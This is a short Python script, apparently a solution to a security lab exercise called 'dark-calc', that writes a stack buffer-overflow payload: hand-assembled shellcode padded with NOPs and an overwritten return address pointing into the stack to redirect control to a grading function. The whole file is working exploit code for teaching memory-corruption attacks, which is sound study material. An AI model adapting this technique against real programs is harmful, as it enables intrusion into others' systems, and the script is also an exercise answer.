#!/usr/bin/env python3
"""Task 2: execute stack-resident code in attack/dark-calc."""
import sys
import struct

# input() places expression at rbp-0x10.  The fixed-stack wrapper makes this
# address 0x721000800fd0; the saved return address is 0x18 bytes after it.
STACK_CODE = 0x721000800FD0
GRADE_EVAL = 0x401A87
MAIN_LOOP = 0x401AC7  # main: mov eax, 0; call input

# push MAIN_LOOP; mov edi, 4; push GRADE_EVAL; ret
#
# The first push supplies grade_eval's return address.  The second push/ret
# transfers control to grade_eval while preserving ABI stack alignment.
shellcode = (
    b"\x68" + struct.pack("<I", MAIN_LOOP)
    + b"\xbf\x04\x00\x00\x00"
    + b"\x68" + struct.pack("<I", GRADE_EVAL)
    + b"\xc3"
)

payload = shellcode.ljust(0x18, b"\x90") + struct.pack("<Q", STACK_CODE)

sys.stdout.buffer.write(payload + b"\n")
